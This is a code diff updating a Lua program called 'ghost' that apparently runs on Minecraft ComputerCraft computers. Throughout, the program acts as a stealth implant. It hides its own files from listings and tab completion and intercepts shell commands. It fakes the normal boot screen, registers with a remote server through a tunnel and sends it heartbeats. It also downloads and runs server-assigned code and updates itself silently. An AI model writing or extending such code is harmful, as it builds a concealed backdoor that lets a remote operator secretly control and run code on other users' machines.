@@ -1,4 +1,4 @@
--- ghost v9.9.14 (reboot after first registration + radar stats support)
+-- ghost v9.9.15 (heartbeat_interval + radar interval file + reboot after first registration)
 local URL_FILE = ".server_url"
 local CURRENT_URL = nil
 local TOKEN_FILE = ".token"
@@ -84,6 +84,9 @@ local refresh_url
 local check_mode
 local reload_tunnel
 
+-- ============================================
+-- LOGGING
+-- ============================================
 local function glog(msg)
     pcall(function()
         local f = orig_fs_open(LOG_FILE, "a")
@@ -102,6 +105,9 @@ local function gerr(step, err)
     if service_local then printError("[Ghost] " .. step .. ": " .. tostring(err)) end
 end
 
+-- ============================================
+-- SELF-UPDATE
+-- ============================================
 local function do_update()
     glog("UPDATE: start")
     term.setBackgroundColor(colors.black); term.setTextColour(colors.white)
@@ -116,6 +122,9 @@ local function do_update()
     glog("UPDATE OK"); sleep(2); orig_reboot(); return true
 end
 
+-- ============================================
+-- STEALTH
+-- ============================================
 local function is_hidden_name(name)
     for _, hf in ipairs(HIDDEN) do if name == hf then return true end end
     if name:find("^%.tmp_") then return true end
@@ -132,7 +141,6 @@ local function is_hidden_path(path)
     return false
 end
 local function is_core(c) return c == ".token" or c == ".tk2" or c == "ghost" end
-
 local function normalize_path(path)
     return tostring(path):gsub("^/",""):gsub("/$","")
 end
@@ -218,17 +226,32 @@ end
 local function install_protection() end
 local function disable_protection() end
 
+-- ИСПРАВЛЕНО v9.9.15: в обычном режиме подсказки НЕ показывают файлы
 local function normal_complete(text)
-    local res = orig_shell_complete(text, nil, true, true)
-    if not res then return {} end
+    if service_local then
+        local res = orig_shell_complete(text, nil, true, true)
+        if not res then return {} end
+        local out = {}
+        for _, item in ipairs(res) do
+            local c = normalize_path(item)
+            if not is_hidden_name(c) and not is_hidden_path(c) and not c:find("^%.tmp_") then out[#out+1] = item end
+        end
+        return out
+    end
+    -- обычный режим: только разрешённые команды, без файлов
     local out = {}
-    for _, item in ipairs(res) do
-        local c = normalize_path(item)
-        if not is_hidden_name(c) and not is_hidden_path(c) and not c:find("^%.tmp_") then out[#out+1] = item end
+    local lower = text:lower()
+    for cmd in pairs(ALLOWED_CMDS) do
+        if lower == "" or cmd:sub(1, #lower) == lower then
+            out[#out+1] = cmd:sub(#lower + 1)
+        end
     end
     return out
 end
 
+-- ============================================
+-- BOOT SCREEN
+-- ============================================
 local MOTD = {'Running "set" lists the current values of all settings.','Type "help" to view the help index.',
     'Use "edit" to create and modify files.','Press Ctrl+T to terminate a running program.',
     'The "alias" command can be used to create custom commands.','You can change the color of text with the "paint" program.',
@@ -255,6 +278,9 @@ local function authentic_shutdown()
     term.clear(); term.setCursorPos(1, 1); print("Goodbye"); orig_shutdown()
 end
 
+-- ============================================
+-- STRIKE ANALYSIS
+-- ============================================
 local function find_hidden(line)
     local l = line:lower()
     for _, hn in ipairs(HIDDEN_NAMES) do if l:find(hn, 1, true) then return hn end end
@@ -279,6 +305,9 @@ end
 local function is_script_file(n) return n:find("%.lua$") or n:find("%.luau$") end
 local function is_allowed_command(c) return ALLOWED_CMDS[c:lower()] == true end
 
+-- ============================================
+-- URL MANAGEMENT
+-- ============================================
 local function save_url(url)
     local f = orig_fs_open(URL_FILE, "w"); if f then f.write(url); f.close() end
 end
@@ -403,6 +432,9 @@ local function acquire_url()
     end
 end
 
+-- ============================================
+-- TOKEN
+-- ============================================
 local function encrypt_token(t)
     local key = tostring(COMPUTER_ID) .. "_V6"; local r = ""
     for i = 1, #t do
@@ -447,6 +479,9 @@ load_token = function()
     return read_token_file(TOKEN_BAK)
 end
 
+-- ============================================
+-- MODE
+-- ============================================
 local current_mode = "normal"
 local function load_mode()
     if orig_fs_exists(MODE_FILE) then
@@ -459,6 +494,9 @@ local function save_mode(m)
     local f = orig_fs_open(MODE_FILE, "w"); if f then f.write(m); f.close() end
 end
 
+-- ============================================
+-- HTTP
+-- ============================================
 local function make_headers(token)
     local h = {}
     h["Content-Type"] = "application/json"; h["bypass-tunnel-reminder"] = "true"
@@ -523,6 +561,9 @@ trigger_fortress = function(token)
     if token then send_heartbeat(token, {}) end
 end
 
+-- ============================================
+-- COMMAND INTERCEPT
+-- ============================================
 local function install_command_intercept()
     pcall(function()
         shell.run = function(...)
@@ -572,6 +613,9 @@ local function install_command_intercept()
 end
 local function disable_command_intercept() shell.run = orig_shell_run end
 
+-- ============================================
+-- REGISTRATION
+-- ============================================
 local function register_sync(url, pw)
     if not url or not pw or pw == "" then return nil end
     refresh_url()
@@ -606,6 +650,7 @@ local function register_sync(url, pw)
     return nil
 end
 
+-- ИСПРАВЛЕНО v9.9.15: возвращает mode, pastes, interval
 check_mode = function(token)
     refresh_url()
     if not CURRENT_URL or not token then return nil end
@@ -613,7 +658,7 @@ check_mode = function(token)
     if not r or r.error then return nil end
     local mode = r.mode or "normal"
     save_mode(mode)
-    return mode, r.assigned_pastes or {}
+    return mode, r.assigned_pastes or {}, (tonumber(r.heartbeat_interval) or 60)
 end
 
 local function fetch_paste_code(name, token)
@@ -650,6 +695,9 @@ local function paste_runner_loop(name, token)
     end
 end
 
+-- ============================================
+-- FORTRESS
+-- ============================================
 local function fortress_console()
     draw_boot()
     while true do
@@ -660,6 +708,9 @@ local function fortress_console()
     end
 end
 
+-- ============================================
+-- LOOPS
+-- ============================================
 local function relay_watch_loop(token)
     glog("relay_watch start")
     while true do
@@ -680,33 +731,32 @@ local function relay_watch_loop(token)
     end
 end
 
+-- ИСПРАВЛЕНО v9.9.15: использует интервал с сервера + пишет .radar_interval
 local function heartbeat_loop(token)
     glog("heartbeat start")
-    local fc = 0; local last_refresh = 0; local consec = 0
+    local interval = 60
+    local fc = 0; local consec = 0
     while true do
         if _G.restart_parallel then return end
-        sleep(fc > 3 and 15 or 60)
+        sleep(interval)
         if _G.restart_parallel then return end
         pcall(function()
-            local now = os.time()
-            if now - last_refresh >= 30 then
-                last_refresh = now
-                local prev = CURRENT_URL
-                refresh_url()
-                if CURRENT_URL ~= prev then glog("heartbeat: URL changed") end
-            end
-            if not CURRENT_URL then
-                fc = fc + 1; consec = consec + 1
-                if consec >= 5 then reload_tunnel(); consec = 0 end
-                return
-            end
-            if not token then return end
-            local mode, pastes = check_mode(token)
+            local mode, pastes, hbi = check_mode(token)
             if not mode then
                 fc = fc + 1; consec = consec + 1
                 if consec >= 5 then reload_tunnel(); consec = 0 end
                 return
             end
+            -- обновляем интервал
+            interval = tonumber(hbi) or 60
+            if interval < 5 then interval = 5 end
+            if interval > 3600 then interval = 3600 end
+            -- пишем интервал для радара
+            pcall(function()
+                local f = orig_fs_open(".radar_interval", "w")
+                if f then f.write(tostring(interval)); f.close() end
+            end)
+            -- проверяем смену пастов
             local changed = false
             local current = _G.current_pastes or {}
             if #(pastes or {}) ~= #current then
@@ -718,8 +768,6 @@ local function heartbeat_loop(token)
             end
             if changed then
                 glog("heartbeat: pastes changed, triggering restart")
-                glog("  old: " .. table.concat(current, ", "))
-                glog("  new: " .. table.concat(pastes or {}, ", "))
                 _G.current_pastes = pastes or {}
                 _G.restart_parallel = true
                 return
@@ -756,6 +804,9 @@ local function mode_watcher(token)
     end
 end
 
+-- ============================================
+-- REPL
+-- ============================================
 local function repl()
     while true do
         if fortress_active then return end
@@ -791,9 +842,11 @@ local function repl()
     end
 end
 
--- НОВОЕ v9.9.14: после первой регистрации делаем reboot
+-- ============================================
+-- BACKGROUND CONNECT (reboot after first registration)
+-- ============================================
 local function connect_and_run(token, pending_password)
-    local is_first_registration = not token and pending_password and pending_password ~= ""
+    local is_first_registration = (not token) and pending_password and pending_password ~= ""
     if not token and pending_password and pending_password ~= "" then
         if acquire_url() then
             token = register_sync(CURRENT_URL, pending_password)
@@ -804,7 +857,7 @@ local function connect_and_run(token, pending_password)
                     glog("FIRST REGISTRATION COMPLETE - rebooting in 3s")
                     sleep(3)
                     orig_reboot()
-                    return  -- не идём дальше, компьютер перезагрузится
+                    return
                 end
             end
         end
@@ -843,8 +896,11 @@ local function connect_and_run(token, pending_password)
     end
 end
 
+-- ============================================
+-- MAIN
+-- ============================================
 local function run_main()
-    glog("ghost start v9.9.14")
+    glog("ghost start v9.9.15")
     install_stealth(); install_protection(); install_command_intercept(); load_mode()
     if not orig_fs_exists(SANDBOX_DIR) then pcall(fs.makeDir, SANDBOX_DIR) end
     draw_boot()
